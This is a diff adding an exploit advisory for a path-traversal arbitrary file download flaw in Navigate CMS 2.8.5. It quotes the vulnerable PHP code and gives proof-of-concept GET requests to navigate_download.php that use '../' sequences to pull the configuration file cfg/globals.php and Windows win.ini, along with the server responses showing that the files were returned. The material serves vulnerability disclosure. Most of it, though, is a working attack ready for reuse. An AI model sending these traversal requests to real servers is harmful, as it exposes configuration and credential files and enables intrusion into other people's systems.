@@ -1,0 +1,105 @@
+# Exploit Title: Navigate CMS 2.8.5 - Arbitrary File Download
+# Dork: N/A
+# Date: 2018-10-13
+# Exploit Author: Ihsan Sencan
+# Vendor Homepage: https://www.navigatecms.com/
+# Software Link: http://master.dl.sourceforge.net/project/navigatecms/releases/navigate-2.8.5r1355.zip
+# Version: 2.8.5
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: N/A
+ 
+# POC: 
+# 1)
+# Description
+# Profile type users+ can download arbitrary files.
+# http://TARGET/[PATH]/navigate_download.php?wid=1&id=[FILE]
+# 
+# /* `exploitdb`.`nv_profiles` */
+# $nv_profiles = array(
+#   array('id' => '1','name' => 'Administrator','description' => '','menus' => '["2","3","4","6","1"]'),
+#   array('id' => '2','name' => 'User','description' => 'Default Navigate CMS user profile','menus' => '["2","3","7"]')
+# );
+# 
+# navigate_download.php
+# ........
+# $id = $_REQUEST['id'];
+# if(!empty($_REQUEST['id']))
+# {
+# 	if(is_int($id))
+# 		$item->load($id);
+# 	else
+# 		$item->load($_REQUEST['id']);
+# }
+# 
+# if(!$item->id)
+# {
+# 	echo 'Error: no item found with id '.$_REQUEST['id'].'.';	
+# 	session_write_close();
+# 	$DB->disconnect(); 	// we don't need the database anymore (we'll see)
+# 	exit;
+# }
+# 
+# $website = new Website();
+# if(!empty($_GET['wid']))
+# ........
+
+# http://TARGET/[PATH]/navigate_download.php?wid=1&id=../../../cfg/globals.php
+ 
+GET /[PATH]/navigate_download.php?wid=1&id=../../../cfg/globals.php HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Cookie: navigate-language=en; PHPSESSID=43c3fe79r969u85bk1qlak7o03; NVSID_ec36e8b8=43c3fe79r969u85bk1qlak7o03; navigate-tinymce-scroll=%7B%7D
+Connection: keep-alive
+HTTP/1.1 200 OK
+Date: Sat, 13 Oct 2018 12:36:12 GMT
+Server: Apache/2.4.25 (Win32) OpenSSL/1.0.2j PHP/5.6.30
+X-Powered-By: PHP/5.6.30
+Set-Cookie: NVSID_ec36e8b8=43c3fe79r969u85bk1qlak7o03; path=/
+Set-Cookie: NVSID_ec36e8b8=43c3fe79r969u85bk1qlak7o03; expires=Sat, 13-Oct-2018 13:36:12 GMT; Max-Age=3600; path=/; domain=TARGET
+Set-Cookie: PHPSESSID=43c3fe79r969u85bk1qlak7o03; expires=Sat, 13-Oct-2018 13:36:12 GMT; Max-Age=3600; path=/; domain=TARGET
+Expires: Sat, 20 Oct 2018 12:36:12 GMT
+Cache-Control: private
+Pragma: cache
+Etag: "Li4vLi4vLi4vY2ZnL2dsb2JhbHMucGhwLWdsb2JhbHMucGhwLTE1Mzk0MzQxNzItMTUzOTQzMjA3MC0w"
+Accept-Ranges: bytes
+Content-Disposition: inline; filename="globals.php"
+Last-Modified: Sat, 13 Oct 2018 12:01:10 GMT
+Content-Range: bytes 0-1847/1848
+Content-Length: 1848
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: application/octet-stream
+
+# http://localhost/[PATH]/navigate_download.php?wid=1&id=../../../../../../../../Windows/win.ini
+
+GET /[PATH]/navigate_download.php?wid=1&id=../../../../../../../../Windows/win.ini HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Cookie: navigate-language=en; PHPSESSID=43c3fe79r969u85bk1qlak7o03; NVSID_ec36e8b8=43c3fe79r969u85bk1qlak7o03; navigate-tinymce-scroll=%7B%7D
+Connection: keep-alive
+HTTP/1.1 200 OK
+Date: Sat, 13 Oct 2018 12:55:57 GMT
+Server: Apache/2.4.25 (Win32) OpenSSL/1.0.2j PHP/5.6.30
+X-Powered-By: PHP/5.6.30
+Set-Cookie: NVSID_ec36e8b8=43c3fe79r969u85bk1qlak7o03; path=/
+Set-Cookie: NVSID_ec36e8b8=43c3fe79r969u85bk1qlak7o03; expires=Sat, 13-Oct-2018 13:55:57 GMT; Max-Age=3600; path=/; domain=TARGET
+Set-Cookie: PHPSESSID=43c3fe79r969u85bk1qlak7o03; expires=Sat, 13-Oct-2018 13:55:57 GMT; Max-Age=3600; path=/; domain=TARGET
+Expires: Sat, 20 Oct 2018 12:55:57 GMT
+Cache-Control: private
+Pragma: cache
+Etag: "Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vV2luZG93cy93aW4uaW5pLXdpbi5pbmktMTUzOTQzNTM1Ny0xNTAxMTQ5NjkxLTA="
+Accept-Ranges: bytes
+Content-Disposition: attachment; filename="win.ini"
+Last-Modified: Thu, 27 Jul 2017 10:01:31 GMT
+Content-Range: bytes 0-563/564
+Content-Length: 564
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: application/octet-stream
